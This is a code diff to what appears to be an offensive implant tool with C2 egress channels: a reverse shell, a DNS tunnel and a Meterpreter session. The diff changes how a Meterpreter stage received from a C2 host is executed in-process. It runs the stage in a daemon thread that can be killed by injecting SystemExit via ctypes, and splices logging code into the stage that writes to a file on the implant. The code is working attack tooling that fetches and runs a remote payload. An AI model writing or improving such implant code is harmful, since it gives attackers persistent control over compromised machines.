@@ -19,6 +19,10 @@ import logging
 import os
 import re
 import signal
+try:
+    import ctypes
+except ImportError:
+    ctypes = None
 import shutil
 import socket
 import struct
@@ -45,6 +49,7 @@ _c2_method = None
 _pty_child_pid = None          # Tracked so signal handler can kill it
 _meterpreter_socket = None     # Tracked so force_shutdown can kill dispatch threads
 _watchdog_stop = threading.Event()
+_exec_kill_event = threading.Event()  # Signal for killing meterpreter exec thread
 
 
 def force_shutdown():
@@ -55,6 +60,7 @@ def force_shutdown():
     global _current_state, _meterpreter_socket
     _current_state = EgressState.FAILED
     _watchdog_stop.set()
+    _exec_kill_event.set()
 
     # Kill pty.spawn child (reverse shell)
     if _pty_child_pid:
@@ -82,6 +88,50 @@ def force_shutdown():
         except OSError:
             pass
         _meterpreter_socket = None
+
+def _kill_exec_thread(t):
+    """Terminate the meterpreter exec thread by injecting SystemExit.
+
+    The meterpreter stage's dispatch loop has bare ``except:`` clauses
+    that swallow all exceptions (including socket errors from
+    force_shutdown's socket close).  The only way to break out is to
+    repeatedly inject SystemExit via the C-API until one lands outside
+    a bare-except handler.
+    """
+    if not t.is_alive():
+        return
+    tid = t.ident
+    if not tid:
+        return
+    if ctypes is None or not hasattr(ctypes, "pythonapi"):
+        log.warning("ctypes unavailable — cannot inject SystemExit "
+                    "into exec thread; it will be abandoned (daemon)")
+        return
+    log.info("Injecting SystemExit into meterpreter exec thread "
+             "(tid=%d)", tid)
+    for _attempt in range(20):          # up to 10 s
+        if not t.is_alive():
+            break
+        try:
+            res = ctypes.pythonapi.PyThreadState_SetAsyncExc(
+                ctypes.c_ulong(tid), ctypes.py_object(SystemExit))
+            if res == 0:                # thread already gone
+                break
+            if res > 1:                 # more than one thread hit — undo
+                ctypes.pythonapi.PyThreadState_SetAsyncExc(
+                    ctypes.c_ulong(tid), None)
+                log.error("PyThreadState_SetAsyncExc affected >1 thread")
+                break
+        except Exception as e:
+            log.warning("Cannot inject SystemExit: %s", e)
+            break
+        time.sleep(0.5)
+    if t.is_alive():
+        log.warning("Exec thread did not terminate after 10 s — "
+                    "abandoned as daemon thread")
+    else:
+        log.info("Meterpreter exec thread terminated")
+
 
 # ── DNS Tunnel (iodine) ────────────────────────────────────────
 
@@ -426,16 +476,74 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             log.info("Meterpreter stage patched: fork disabled, "
                      "setsid disabled — dispatch runs in-process")
 
+            # ── Diagnostic: log the timeout values MSF sends ─────
+            # The stage sets communication_timeout from the handler's
+            # SessionCommunicationTimeout TLV.  0 means "never" to MSF
+            # but the stage may interpret it as "expire immediately."
+            # This diagnostic writes the actual values to a file on
+            # the implant so the next run gives hard data.
+            _diag_pre = (
+                'open("/tmp/landnav_met_diag.log","a").write('
+                '"[%s] INIT comm_timeout=%s sess_expiry=%s'
+                ' transport=%s\\n" % ('
+                '__import__("datetime").datetime.now(),'
+                'getattr(met,"communication_timeout","?"),'
+                'getattr(met,"session_expiry_time",'
+                'getattr(met,"session_expiry_end","?")),'
+                'type(getattr(met,"transport",None)).__name__)); '
+            )
+            _diag_post = (
+                '; open("/tmp/landnav_met_diag.log","a").write('
+                '"[%s] ENDED running=%s\\n" % ('
+                '__import__("datetime").datetime.now(),'
+                'getattr(met,"running","?")))'
+            )
+            if isinstance(prepared, bytes):
+                prepared = prepared.replace(
+                    b'met.run()',
+                    _diag_pre.encode() + b'met.run()' + _diag_post.encode())
+            else:
+                prepared = prepared.replace(
+                    'met.run()',
+                    _diag_pre + 'met.run()' + _diag_post)
+            log.info("Diagnostic logging injected around met.run()")
+
+            # ── Threaded exec ────────────────────────────────────
+            # Run exec() in a daemon thread so SIGINT/SIGTERM can
+            # actually kill it.  The meterpreter dispatch loop has
+            # bare ``except:`` clauses that swallow socket errors
+            # from force_shutdown(), making exec() uninterruptible
+            # from the main thread.  With exec in its own thread,
+            # we can inject SystemExit via ctypes.
+            _exec_kill_event.clear()
             _t0 = time.monotonic()
-            try:
-                exec(prepared, {"s": s})
-            except SystemExit as e:
-                log.warning("Meterpreter stage called sys.exit(%s)", e.code)
-            except BaseException as e:
-                log.error("Meterpreter stage exception: %s: %s",
-                          type(e).__name__, e)
-                import traceback
-                log.error("Stage traceback:\n%s", traceback.format_exc())
+
+            def _exec_worker():
+                try:
+                    exec(prepared, {"s": s})
+                except SystemExit as e:
+                    log.warning("Meterpreter stage sys.exit(%s)",
+                                getattr(e, "code", "?"))
+                except BaseException as e:
+                    log.error("Meterpreter stage exception: %s: %s",
+                              type(e).__name__, e)
+                    import traceback
+                    log.error("Stage traceback:\n%s",
+                              traceback.format_exc())
+
+            t = threading.Thread(target=_exec_worker, daemon=True,
+                                 name="meterpreter-exec")
+            t.start()
+            log.info("Meterpreter exec thread started (tid=%s)",
+                     t.ident)
+
+            # Poll until exec finishes or force_shutdown fires
+            while t.is_alive():
+                t.join(timeout=1)
+                if _exec_kill_event.is_set():
+                    log.info("Shutdown signal — killing exec thread")
+                    _kill_exec_thread(t)
+                    break
 
             elapsed = time.monotonic() - _t0
             _meterpreter_socket = None
